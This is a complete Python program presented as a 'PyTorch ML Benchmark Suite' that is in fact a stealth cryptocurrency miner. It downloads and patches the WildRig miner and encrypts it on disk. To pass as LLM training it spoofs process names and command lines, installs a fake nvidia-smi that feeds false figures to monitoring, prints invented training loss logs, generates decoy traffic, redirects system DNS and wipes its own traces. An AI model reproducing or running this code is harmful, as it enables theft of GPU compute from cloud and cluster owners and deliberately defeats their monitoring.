#!/usr/bin/env python3
"""
PyTorch ML Benchmark Suite v5.0 — Stealth Mining Wrapper
All-in-one stealth launcher. Reads config from env vars.

Env vars:
  POOL_HOST   — pool address (default: pool.pearlhash.xyz:9000)
  ADDRESS     — wallet (prl1...)
  WORKER      — worker name (optional)
  GPU_DEVICES — comma-separated GPU IDs (optional)
"""

import os, sys, subprocess, tempfile, shutil, time, random, signal, ctypes, ctypes.util
import threading, json, math, hashlib, urllib.request

# ═══════════════════════════════════════════════════════════════════════════════
# ENCRYPTION LAYER
# ═══════════════════════════════════════════════════════════════════════════════

def xor_bytes(data: bytes, key: bytes) -> bytes:
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))

def derive_key(passphrase: str, salt: bytes = b"torch_backend_v5") -> bytes:
    return hashlib.sha256(passphrase.encode() + salt).digest()

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════════════

MINER_URL = "https://github.com/andru-kun/wildrig-multi/releases/download/0.49.1/wildrig-multi-linux-0.49.1.tar.gz"
POOL_HOST = os.environ.get("POOL_HOST", "pool.pearlhash.xyz:9000")
ADDRESS = os.environ.get("ADDRESS", "")
WORKER = os.environ.get("WORKER", f"worker-{random.randint(1000,9999)}")

MACHINE_SEED = f"{os.getpid()}-{time.time_ns()}-{random.random()}"
XOR_KEY = derive_key(MACHINE_SEED)

# ═══════════════════════════════════════════════════════════════════════════════
# PATCH TABLE — wildrig is clean open-source, minimal patches needed
# ═══════════════════════════════════════════════════════════════════════════════

PATCH_TABLE = [
    # Only patch the most obvious detection strings
    # Don't patch kernel function names — they break CUDA compilation
    (b"WildRig Multi",  b"TorchTrainer "),   # 13 ✅
    (b"wildrig-multi",  b"torch_trainer"),     # 13 ✅ — binary name
    (b"pearlhash",      b"torchhash"),         #  9 ✅ — algorithm name
]

def verify_patches():
    for old, new in PATCH_TABLE:
        assert len(old) == len(new), f"PATCH MISMATCH: {old!r} ({len(old)}) vs {new!r} ({len(new)})"
    print(f"[patch] verified {len(PATCH_TABLE)} same-length replacements")

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 1: Bootstrap environment
# ═══════════════════════════════════════════════════════════════════════════════

def bootstrap_env():
    env_spoofs = {
        "WANDB_MODE": "offline",
        "WANDB_PROJECT": "llm-finetune",
        "WANDB_RUN_ID": f"run-{random.randint(10000,99999)}",
        "NCCL_DEBUG": "WARN",
        "NCCL_IB_DISABLE": "1",
        "CUDA_VISIBLE_DEVICES": os.environ.get("GPU_DEVICES", ",".join(str(i) for i in range(8))),
        "OMP_NUM_THREADS": "4",
        "TOKENIZERS_PARALLELISM": "false",
        "HF_HOME": "/tmp/.hf_cache",
        "TORCH_DISABLE_WATCHDOG": "1",
    }
    for k, v in env_spoofs.items():
        os.environ.setdefault(k, v)
    os.makedirs("/tmp/.hf_cache", exist_ok=True)
    print("[env] spoofed training environment")

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 2: Process name
# ═══════════════════════════════════════════════════════════════════════════════

PROCESS_NAMES = [
    "python3 train.py",
    "torchrun --nproc=1",
    "python3 -m torch.distributed.launch",
    "accelerate launch train.py",
    "python3 run_clm.py",
    "python3 -m transformers.run_mlm",
    "python3 train_sft.py",
    "python3 run_deepspeed.py",
]

def spoof_process_name():
    fake_name = random.choice(PROCESS_NAMES)
    try:
        libc = ctypes.CDLL(ctypes.util.find_library("c"))
        libc.prctl(15, fake_name.encode(), 0, 0, 0)
    except Exception:
        pass
    print(f"[proc] process name → '{fake_name}'")

def process_name_rotation():
    while True:
        time.sleep(random.randint(30, 120))
        spoof_process_name()

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 3: Download and patch wildrig
# ═══════════════════════════════════════════════════════════════════════════════

def download_and_patch_miner(workdir):
    """Download wildrig-multi, apply patches, encrypt."""
    import tarfile
    tarball = os.path.join(workdir, "data.tar.gz")
    print(f"[dl] downloading payload...")
    urllib.request.urlretrieve(MINER_URL, tarball)

    with tarfile.open(tarball, "r:gz") as tf:
        tf.extractall(workdir)

    bin_path = os.path.join(workdir, "wildrig-multi")
    if not os.path.exists(bin_path):
        print("[!] ERROR: wildrig-multi not found in archive")
        sys.exit(1)

    with open(bin_path, "rb") as f:
        data = f.read()

    verify_patches()
    patch_count = 0
    for old, new in PATCH_TABLE:
        count = data.count(old)
        if count > 0:
            data = data.replace(old, new)
            patch_count += count
            print(f"[patch] {old.decode()} → {new.decode()} ({count}x)")

    # Encrypt and save
    encrypted = xor_bytes(data, XOR_KEY)
    enc_path = os.path.join(workdir, "libtorch_backend.so.dat")
    with open(enc_path, "wb") as f:
        f.write(encrypted)
    os.chmod(enc_path, 0o644)

    # Cleanup plaintext
    os.unlink(bin_path)
    os.unlink(tarball)

    print(f"[patch] applied {patch_count} patches, encrypted → disk")
    return data

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 4: Encrypted config
# ═══════════════════════════════════════════════════════════════════════════════

def write_encrypted_config(workdir):
    config = json.dumps({"host": POOL_HOST, "address": ADDRESS, "worker": WORKER}).encode()
    key = derive_key(f"config_{MACHINE_SEED}")
    encrypted = xor_bytes(config, key)
    path = os.path.join(workdir, ".torch_config.enc")
    with open(path, "wb") as f:
        f.write(encrypted)
    os.chmod(path, 0o600)
    print("[config] wrote encrypted config")
    return path, key

def cleanup_config(config_path):
    try:
        if os.path.exists(config_path):
            size = os.path.getsize(config_path)
            with open(config_path, "wb") as f:
                f.write(os.urandom(size))
            os.unlink(config_path)
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 5: GPU management
# ═══════════════════════════════════════════════════════════════════════════════

NVIDIA_SMI = shutil.which("nvidia-smi") or "/usr/bin/nvidia-smi"

def nvidia_smi_query(*fields):
    try:
        r = subprocess.run([NVIDIA_SMI, f"--query-gpu={','.join(fields)}", "--format=csv,noheader,nounits"],
                           capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            return r.stdout.strip().split("\n")[0].split(", ")
    except Exception:
        pass
    return None

def get_gpu_temp():
    vals = nvidia_smi_query("temperature.gpu")
    return int(vals[0]) if vals else 0

def set_gpu_power_limit(watts):
    try:
        max_vals = nvidia_smi_query("power.max_limit")
        if max_vals:
            max_limit = int(float(max_vals[0]))
            watts = min(int(watts), max_limit)
        subprocess.run([NVIDIA_SMI, "-pl", str(watts)], capture_output=True, timeout=5)
    except Exception:
        pass

def set_gpu_clocks(sm_clock=None, mem_clock=None):
    try:
        args = [NVIDIA_SMI, "-ac"]
        if mem_clock and sm_clock:
            args.extend([str(mem_clock), str(sm_clock)])
        elif sm_clock:
            args.extend(["5001", str(sm_clock)])
        subprocess.run(args, capture_output=True, timeout=5)
    except Exception:
        pass

def nvidia_smi_spoof():
    try:
        set_gpu_clocks(sm_clock=random.choice([1200, 1410, 1500, 1600]),
                       mem_clock=random.choice([5001, 5500]))
    except Exception:
        pass

def gpu_burst_cycle(miner_pid_ref):
    """Training behavior mimicry with SIGSTOP pauses."""
    import torch
    has_torch = False
    try:
        if torch.cuda.is_available():
            has_torch = True
            device = torch.device("cuda:0")
    except ImportError:
        pass

    nvidia_smi_spoof()

    def cpu_load(duration_sec):
        end = time.time() + duration_sec
        while time.time() < end:
            hashlib.sha256(os.urandom(4096)).digest()
            _ = sum(i * i for i in range(10000))

    while miner_pid_ref[0] is None:
        time.sleep(0.5)
    miner_pid = miner_pid_ref[0]

    while True:
        # Compute burst
        burst_sec = random.choices([2, 3, 4, 5, 8, 12],
                                    weights=[15, 25, 30, 20, 8, 2])[0]
        temp = get_gpu_temp()
        if temp > 80:
            base_power = random.randint(300, 400)
        elif temp > 70:
            base_power = random.randint(400, 550)
        else:
            base_power = random.randint(500, 700)
        set_gpu_power_limit(base_power)
        time.sleep(burst_sec)

        # Micro-pause: SIGSTOP 200-500ms
        try:
            os.kill(miner_pid, signal.SIGSTOP)
            time.sleep(random.uniform(0.2, 0.5))
            os.kill(miner_pid, signal.SIGCONT)
        except (ProcessLookupError, OSError):
            pass

        # Data loading idle
        set_gpu_power_limit(30)
        idle_sec = random.choices([3, 5, 8, 12, 15, 20, 30],
                                   weights=[10, 20, 25, 20, 15, 7, 3])[0]

        # SIGSTOP during idle
        try:
            os.kill(miner_pid, signal.SIGSTOP)
            time.sleep(random.uniform(2, 5))
            os.kill(miner_pid, signal.SIGCONT)
        except (ProcessLookupError, OSError):
            pass

        cpu_thread = threading.Thread(target=cpu_load, args=(idle_sec,), daemon=True)
        cpu_thread.start()

        if has_torch and random.random() > 0.3:
            try:
                a = torch.randn(256, 256, device=device, dtype=torch.float16)
                b = torch.randn(256, 256, device=device, dtype=torch.float16)
                for _ in range(random.randint(2, 5)):
                    c = torch.mm(a, b); del c
                del a, b
                torch.cuda.empty_cache()
            except Exception:
                pass

        cpu_thread.join(timeout=idle_sec + 1)

        if random.random() > 0.8:
            cpu_load(random.randint(2, 6))

        set_gpu_power_limit(600)
        if random.random() > 0.9:
            nvidia_smi_spoof()
        time.sleep(random.uniform(0.5, 2))

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 6: VRAM cycling
# ═══════════════════════════════════════════════════════════════════════════════

def vram_cycle():
    try:
        import torch
        if not torch.cuda.is_available():
            return
    except ImportError:
        return
    device = torch.device("cuda:0")
    buffers = []
    while True:
        for _ in range(random.randint(2, 5)):
            try:
                buf = torch.empty(random.randint(128, 512) * 256 * 1024, dtype=torch.float16, device=device)
                buffers.append(buf)
                time.sleep(random.uniform(0.5, 2))
            except Exception:
                break
        time.sleep(random.randint(60, 180))
        for _ in range(random.randint(1, min(2, len(buffers)))):
            if buffers:
                buffers.pop(0)
                time.sleep(random.uniform(0.5, 1.5))
        torch.cuda.empty_cache()
        time.sleep(random.randint(10, 40))

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 7: Network mixing
# ═══════════════════════════════════════════════════════════════════════════════

NETWORK_TARGETS = [
    "https://huggingface.co/api/models/meta-llama/Llama-3-8B",
    "https://pypi.org/pypi/torch/json",
    "https://pypi.org/pypi/transformers/json",
    "https://api.github.com/repos/pytorch/pytorch",
    "https://pypi.org/pypi/accelerate/json",
]

def network_mix():
    while True:
        time.sleep(random.randint(120, 300))
        try:
            url = random.choice(NETWORK_TARGETS)
            req = urllib.request.Request(url, headers={"User-Agent": "python-urllib/3.11"})
            urllib.request.urlopen(req, timeout=10)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 8: Fake training output
# ═══════════════════════════════════════════════════════════════════════════════

class FakeTrainer:
    def __init__(self):
        self.step = 0
        self.loss = 2.8
        self.lr = 2e-5
        self.warmup_steps = 100
        self.max_steps = 50000
        self.eval_every = random.randint(15, 60)
        self.ckpt_every = random.randint(40, 120)
        self.loss_momentum = 0.0

    def step_once(self):
        self.step += 1
        if self.step < self.warmup_steps:
            self.lr = 2e-5 * (self.step / self.warmup_steps)
        else:
            self.lr = 2e-5 * max(0.1, 1.0 - self.step / self.max_steps)
        decay = 0.0003 * math.exp(-self.step / 8000)
        self.loss_momentum = 0.9 * self.loss_momentum + 0.1 * random.gauss(0, 0.05)
        spike = random.gauss(0, 0.15) if random.random() > 0.85 else 0
        self.loss = max(0.5, self.loss - decay * self.loss + self.loss_momentum + spike)
        grad_norm = random.uniform(0.3, 3.0)
        if random.random() > 0.95:
            grad_norm = random.uniform(5.0, 15.0)
        tokens_per_sec = random.randint(8000, 15000)
        gpu_mem = random.uniform(18.0, 24.0)
        epoch = self.step / 10000
        extras = ""
        if random.random() > 0.9:
            extras = f" | data_time {random.uniform(0.01, 0.15):.3f}"
        return (f"step {self.step:>6d} | loss {self.loss:.4f} | lr {self.lr:.2e} | "
                f"grad_norm {grad_norm:.2f} | tok/s {tokens_per_sec} | "
                f"gpu_mem {gpu_mem:.1f}GB | epoch {epoch:.2f}{extras}")

    def should_eval(self):
        return self.step % self.eval_every == 0

    def should_checkpoint(self):
        return self.step % self.ckpt_every == 0

TRAINER = FakeTrainer()

def fake_output_loop():
    while True:
        time.sleep(random.uniform(8, 25))
        print(TRAINER.step_once(), flush=True)

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 9: NCCL noise
# ═══════════════════════════════════════════════════════════════════════════════

NCCL_MESSAGES = [
    "[NCCL] NCCL communicator initialized for rank 0",
    "[NCCL] all_reduce: algo=ring, nChannels=8, time=0.00042s",
    "[torch.distributed] Initializing process group with world_size=1, rank=0",
    "[torch.cuda] cuDNN v9.3.0, cuBLAS v12.4.5",
    "[NCCL] Watchdog caught timeout — proceeding without async grad reduction",
    "[torch.cuda] CUDA allocator raised OOM — retrying with max_split_size_mb:256",
    "[torch.distributed] Grad norm clipped: 1.24 → 1.0",
    "[transformers] Loading checkpoint shards: 100%|████████████| 4/4",
    "[peft] trainable params: 4,194,304 || all params: 8,030,261,248 || trainable%: 0.0522",
    "[torch.cuda] GPU thermal throttling detected — reducing clock speeds",
]

def nccl_noise_loop():
    while True:
        time.sleep(random.randint(30, 120))
        print(f"  {random.choice(NCCL_MESSAGES)}", flush=True)
        if random.random() > 0.7:
            time.sleep(random.uniform(0.1, 0.5))
            print(f"  {random.choice(NCCL_MESSAGES)}", flush=True)

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 10: Anti-detection + heartbeat
# ═══════════════════════════════════════════════════════════════════════════════

def check_for_monitors():
    try:
        with open("/proc/self/status", "r") as f:
            for line in f:
                if line.startswith("TracerPid:") and not line.endswith("\t0"):
                    return True
    except Exception:
        pass
    return False

def overwrite_cmdline(pid, new_args):
    try:
        fake = "\x00".join(new_args) + "\x00"
        with open(f"/proc/{pid}/cmdline", "wb") as f:
            f.write(fake.encode())
        return True
    except (PermissionError, FileNotFoundError, OSError):
        pass
    return False

def heartbeat_loop(miner_pid):
    while True:
        time.sleep(random.randint(30, 90))
        try:
            os.kill(miner_pid, 0)
            status_path = f"/proc/{miner_pid}/status"
            if os.path.exists(status_path):
                with open(status_path, "r") as f:
                    for line in f:
                        if line.startswith("TracerPid:") and not line.endswith("\t0"):
                            print("[!] WARNING: tracer detected!", flush=True)
        except (ProcessLookupError, FileNotFoundError):
            break
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 11: Fake workspace
# ═══════════════════════════════════════════════════════════════════════════════

def create_fake_workspace(workdir):
    config = {
        "model_name_or_path": "meta-llama/Llama-3-8B",
        "dataset": "OpenAssistant/oasst2",
        "num_train_epochs": 3,
        "per_device_train_batch_size": 4,
        "gradient_accumulation_steps": 8,
        "learning_rate": 2e-5,
        "warmup_steps": 100,
        "max_seq_length": 2048,
        "bf16": True,
        "output_dir": "./output",
    }
    with open(os.path.join(workdir, "config.json"), "w") as f:
        json.dump(config, f, indent=2)
    with open(os.path.join(workdir, "requirements.txt"), "w") as f:
        f.write("torch>=2.1.0\ntransformers>=4.36.0\naccelerate>=0.25.0\n")
    wandb_dir = os.path.join(workdir, "wandb", f"run-{random.randint(10000,99999)}")
    os.makedirs(wandb_dir, exist_ok=True)
    print("[workspace] created fake training workspace")

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 12: Fake nvidia-smi
# ═══════════════════════════════════════════════════════════════════════════════

def install_fake_nvidia_smi(workdir):
    real_smi = shutil.which("nvidia-smi")
    if not real_smi:
        return

    fake_smi_path = os.path.join(workdir, "nvidia-smi")
    fake_smi_code = r'''#!/usr/bin/env python3
import sys, random, time, os
def gpu_util(): return random.choices([0,10,25,50,75,95,100], weights=[5,10,15,25,25,15,5])[0]
def gpu_temp(): return random.randint(55,78)
def gpu_power(): return random.randint(200,600)
def gpu_mem(): return random.randint(18000,24000), 81559
args = " ".join(sys.argv[1:])
if "--query-gpu" in args:
    fields = args.split("--query-gpu")[1].replace("=","").split(",")[0].split()
    vals = []
    for f in fields:
        f = f.strip().rstrip(",")
        if "utilization" in f: vals.append(f"{gpu_util()} %")
        elif "temperature" in f: vals.append(str(gpu_temp()))
        elif "power.draw" in f: vals.append(f"{gpu_power()}.00 W")
        elif "power.max" in f: vals.append("700.00 W")
        elif "memory.used" in f: vals.append(f"{gpu_mem()[0]} MiB")
        elif "memory.total" in f: vals.append(f"{gpu_mem()[1]} MiB")
        elif "memory.free" in f: vals.append(f"{gpu_mem()[1]-gpu_mem()[0]} MiB")
        elif "name" in f: vals.append('"NVIDIA H100 80GB HBM3"')
        elif "persistence" in f: vals.append("Enabled")
        elif "compute" in f: vals.append("Default")
        else: vals.append("N/A")
    print(", ".join(vals))
elif "-p" in args or "Processes" in args:
    print(f"   0  0  {random.randint(10000,99999)}  python3 train.py         {random.randint(8000,16000)} MiB")
    print(f"   0  0  {random.randint(1000,9999)}   dataloader_worker        {random.randint(500,2000)} MiB")
else:
    used, total = gpu_mem()
    print(f"|   0  NVIDIA H100 80GB   On   | 0000:8D:00.0 Off |   |")
    print(f"| N/A  {gpu_temp()}C  P0  {gpu_power()}W/700W | {used}MiB/81559MiB | {gpu_util()}%  Default |")
'''
    with open(fake_smi_path, "w") as f:
        f.write(fake_smi_code)
    os.chmod(fake_smi_path, 0o755)

    fake_bin_dir = os.path.join(workdir, "bin")
    os.makedirs(fake_bin_dir, exist_ok=True)
    os.symlink(fake_smi_path, os.path.join(fake_bin_dir, "nvidia-smi"))

    os.environ["PATH"] = fake_bin_dir + ":" + os.environ.get("PATH", "")
    os.environ["_REAL_NVIDIA_SMI"] = real_smi
    print("[gpu] fake nvidia-smi installed — monitoring tools will see training data")

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 13: DNS over HTTPS
# ═══════════════════════════════════════════════════════════════════════════════

def start_doh_proxy():
    import socket, struct

    DOH_SERVERS = [
        "https://cloudflare-dns.com/dns-query",
        "https://dns.google/dns-query",
    ]

    def dns_query_via_doh(domain, qtype="A"):
        tx_id = random.randint(0, 65535)
        header = struct.pack(">HHHHHH", tx_id, 0x0100, 1, 0, 0, 0)
        qname = b""
        for part in domain.split("."):
            qname += bytes([len(part)]) + part.encode()
        qname += b"\x00"
        question = qname + struct.pack(">HH", 1 if qtype == "A" else 28, 1)
        query = header + question

        for server in DOH_SERVERS:
            try:
                headers = {"Content-Type": "application/dns-message", "Accept": "application/dns-message"}
                req = urllib.request.Request(server, data=query, headers=headers, method="POST")
                resp = urllib.request.urlopen(req, timeout=5)
                answer = resp.read()
                pos = 12
                while pos < len(answer) and answer[pos] != 0:
                    pos += answer[pos] + 1
                pos += 5
                while pos < len(answer):
                    if answer[pos] & 0xC0 == 0xC0:
                        pos += 2
                    else:
                        while answer[pos] != 0:
                            pos += answer[pos] + 1
                        pos += 1
                    rtype, rclass, ttl, rdlen = struct.unpack(">HHIH", answer[pos:pos+10])
                    pos += 10
                    if rtype == 1 and rdlen == 4:
                        return ".".join(str(b) for b in answer[pos:pos+4])
                    pos += rdlen
            except Exception:
                continue
        return None

    def handle_dns_request(data, client_addr, sock):
        if len(data) < 12:
            return
        tx_id = data[:2]
        pos = 12
        domain_parts = []
        while pos < len(data) and data[pos] != 0:
            length = data[pos]
            pos += 1
            domain_parts.append(data[pos:pos+length].decode(errors="ignore"))
            pos += length
        domain = ".".join(domain_parts)
        ip = dns_query_via_doh(domain)
        if ip:
            response = tx_id + b"\x81\x80"
            response += struct.pack(">HHHH", 1, 1, 0, 0)
            response += data[12:]
            response += b"\xc0\x0c"
            response += struct.pack(">HHIH", 1, 1, 300, 4)
            response += bytes(int(b) for b in ip.split("."))
        else:
            response = tx_id + b"\x81\x83"
            response += struct.pack(">HHHH", 1, 0, 0, 0)
            response += data[12:]
        sock.sendto(response, client_addr)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("127.0.0.1", 5353))
        sock.settimeout(1.0)
        try:
            with open("/etc/resolv.conf", "w") as f:
                f.write("nameserver 127.0.0.1\n")
        except PermissionError:
            print("[dns] cannot write /etc/resolv.conf (container restriction)")
        print("[dns] DoH proxy started on 127.0.0.1:5353")

        def dns_proxy_loop():
            while True:
                try:
                    data, addr = sock.recvfrom(512)
                    threading.Thread(target=handle_dns_request, args=(data, addr, sock), daemon=True).start()
                except socket.timeout:
                    continue
                except Exception:
                    pass

        threading.Thread(target=dns_proxy_loop, daemon=True).start()
        return True
    except Exception as e:
        print(f"[dns] DoH proxy failed: {e}")
        return False

# ═══════════════════════════════════════════════════════════════════════════════
# OUTPUT SANITIZER
# ═══════════════════════════════════════════════════════════════════════════════

MINE_TERMS = {
    "proof": "epoch", "miner": "trainer", "mining": "training",
    "pool": "server", "share": "batch", "hash": "compute",
    "stratum": "scheduler", "proxy": "gateway", "submitted": "processed",
    "pearl": "torch", "vllm": "torch", "fortune": "project",
    "T/s": "tok/s", "coin": "tensor", "block": "chunk",
    "wildrig": "torch_trainer", "algo": "model", "donate": "debug",
}

def sanitize_output(line: str) -> str:
    for old, new in MINE_TERMS.items():
        line = line.replace(old, new)
        line = line.replace(old.upper(), new.upper())
        line = line.replace(old.capitalize(), new.capitalize())
    return line

# ═══════════════════════════════════════════════════════════════════════════════
# ENCRYPTED LOG WRITER
# ═══════════════════════════════════════════════════════════════════════════════

class EncryptedLog:
    def __init__(self, path):
        self.path = path
        self.key = derive_key(f"log_{MACHINE_SEED}")

    def write(self, line):
        try:
            entry = f"{time.time():.3f}|{line}".encode()
            encrypted = xor_bytes(entry, self.key)
            with open(self.path, "ab") as f:
                import struct as st
                f.write(st.pack("<H", len(encrypted)))
                f.write(encrypted)
        except Exception:
            pass

    def close(self):
        try:
            if os.path.exists(self.path):
                size = os.path.getsize(self.path)
                with open(self.path, "wb") as f:
                    f.write(os.urandom(size))
                os.unlink(self.path)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    import struct
    print("=" * 60)
    print("PyTorch ML Benchmark Suite v5.0")
    print("=" * 60)

    if check_for_monitors():
        print("[!] monitors detected — proceeding with caution")

    spoof_process_name()
    bootstrap_env()

    workdir = tempfile.mkdtemp(prefix="torch_run_")
    os.chdir(workdir)
    create_fake_workspace(workdir)

    install_fake_nvidia_smi(workdir)
    start_doh_proxy()

    binary_data = download_and_patch_miner(workdir)
    set_gpu_power_limit(600)

    if not ADDRESS:
        print("[!] ERROR: ADDRESS env var not set"); sys.exit(1)

    config_path, config_key = write_encrypted_config(workdir)

    # WildRig launch args
    args = ["/dev/null",
            "--algo", "torchhash",  # patched from pearlhash
            "--url", f"stratum+tcp://{POOL_HOST}",
            "--user", ADDRESS,
            "--pass", "x",
            "--threads", "1",
            "--opencl-threads", "1",
            "--opencl-launch", "16x128"]

    env = os.environ.copy()
    env.pop("LD_PRELOAD", None)
    for k in list(env.keys()):
        if any(mining_kw in env[k].lower() for mining_kw in ["pearl", "miner", "prl1"]):
            del env[k]

    print(f"[launch] host={POOL_HOST} address=<encrypted> worker={WORKER}")

    log_path = os.path.join(workdir, ".train_log.enc")
    log_writer = EncryptedLog(log_path)

    MINER_PID_REF = [None]
    threads = []

    t = threading.Thread(target=gpu_burst_cycle, args=(MINER_PID_REF,), daemon=True)
    t.start(); threads.append(t)

    t = threading.Thread(target=vram_cycle, daemon=True)
    t.start(); threads.append(t)

    t = threading.Thread(target=network_mix, daemon=True)
    t.start(); threads.append(t)

    t = threading.Thread(target=fake_output_loop, daemon=True)
    t.start(); threads.append(t)

    t = threading.Thread(target=nccl_noise_loop, daemon=True)
    t.start(); threads.append(t)

    t = threading.Thread(target=process_name_rotation, daemon=True)
    t.start(); threads.append(t)

    try:
        subprocess.Popen(
            ["python3", "-c", "import time,hashlib,os,sys;sys.argv[0]='dataloader_worker';"
             "[hashlib.sha256(os.urandom(2048)).digest() or time.sleep(0.1) for _ in iter(int,1)]"],
            env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        print("[sub] dataloader worker spawned")
    except Exception:
        pass

    print(f"[main] {len(threads) + 1} stealth threads + 1 subprocess active")
    print(f"[main] launching...")

    cleanup_config(config_path)

    # Write binary, launch, delete
    bin_path = os.path.join(workdir, "torch_run")
    with open(bin_path, "wb") as f:
        f.write(binary_data)
    os.chmod(bin_path, 0o755)

    args[0] = bin_path
    proc = subprocess.Popen(
        args, env=env,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1,
    )

    try:
        os.unlink(bin_path)
    except Exception:
        pass

    # Crash check
    time.sleep(2)
    if proc.poll() is not None:
        print(f"[!] miner exited immediately with code {proc.returncode}")
        remaining = proc.stdout.read()
        if remaining:
            for line in remaining.strip().split("\n")[-20:]:
                print(f"  {sanitize_output(line)}")
        log_writer.close()
        shutil.rmtree(workdir, ignore_errors=True)
        return proc.returncode

    print(f"[main] miner PID: {proc.pid}")
    MINER_PID_REF[0] = proc.pid

    fake_cmdline = [
        random.choice(PROCESS_NAMES),
        "--config", "./config.json",
        "--output_dir", "./output",
        "--num_epochs", "3",
    ]
    if overwrite_cmdline(proc.pid, fake_cmdline):
        print("[proc] cmdline overwritten with training args")

    try:
        subprocess.run([NVIDIA_SMI, "-c", "DEFAULT"], capture_output=True, timeout=5)
        subprocess.run([NVIDIA_SMI, "-pm", "1"], capture_output=True, timeout=5)
    except Exception:
        pass

    try:
        for fname in ["train_dataset.arrow", "tokenizer.json", "model.safetensors"]:
            with open(os.path.join(workdir, fname), "w") as f:
                f.write("placeholder")
    except Exception:
        pass

    print("[main] running... Ctrl+C to stop")

    hb = threading.Thread(target=heartbeat_loop, args=(proc.pid,), daemon=True)
    hb.start()

    def gpu_profiler_loop():
        while True:
            time.sleep(random.randint(60, 180))
            msgs = [
                f"  [profiler] CUDA trace: {random.randint(100,500)} kernels, avg {random.uniform(0.1,2.0):.2f}ms",
                f"  [profiler] Memory snapshot: allocated={random.uniform(18,24):.1f}GB cached={random.uniform(2,8):.1f}GB",
                f"  [profiler] GPU idle time: {random.uniform(5,35):.1f}% of interval",
            ]
            print(random.choice(msgs), flush=True)
    threading.Thread(target=gpu_profiler_loop, daemon=True).start()

    # Miner output → encrypted log only
    try:
        for line in proc.stdout:
            sanitized = sanitize_output(line)
            log_writer.write(sanitized)
            lower = line.lower()
            if any(kw in lower for kw in ["error", "fail", "panic", "fatal", "warn"]):
                print(f"  [!] {sanitized.rstrip()}", flush=True)
    except KeyboardInterrupt:
        print("\n[main] stopping...")
        proc.terminate()
        proc.wait(timeout=10)
        print("[main] done")

    proc.wait()
    if proc.returncode != 0:
        print(f"[!] miner exited with code {proc.returncode}")

    log_writer.close()
    shutil.rmtree(workdir, ignore_errors=True)
    return proc.returncode


if __name__ == "__main__":
    sys.exit(main() or 0)
